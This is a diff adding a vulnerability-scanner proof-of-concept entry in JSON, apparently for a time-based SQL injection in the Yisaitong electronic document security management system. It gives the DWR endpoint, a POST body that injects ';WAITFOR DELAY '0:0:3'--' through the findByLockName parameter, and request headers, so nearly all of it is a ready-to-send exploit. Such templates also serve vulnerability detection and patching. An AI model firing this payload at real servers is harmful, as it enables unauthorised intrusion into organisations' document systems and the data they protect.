@@ -1,0 +1,20 @@
+{
+	"name":"亿赛通电子文档安全管理系统-jlockseniordao-findbylockname-sql注入",
+	"tag":"yisaitong",
+	"type":"other",
+	"poc":{
+		"pocGet":"/CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr",
+		"pocPost":"callCount=1\r\npage=/CDGServer3/dwr/test/JLockDao\r\nhttpSessionId=\r\nscriptSessionId=\r\nc0-scriptName=JLockSeniorDao\r\nc0-methodName=findByLockName\r\nc0-id=0\r\nc0-param0=string:defaultKey1';WAITFOR DELAY '0:0:3'--\r\nbatchId=0",
+		"header":{
+			"Accept":" */*",
+			"User-Agent":" Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv",
+			"Connection":" close",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+			"Accept-Encoding":" gzip",
+			"Content-Length":" 414",
+			"Content-Type":" text/plain"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
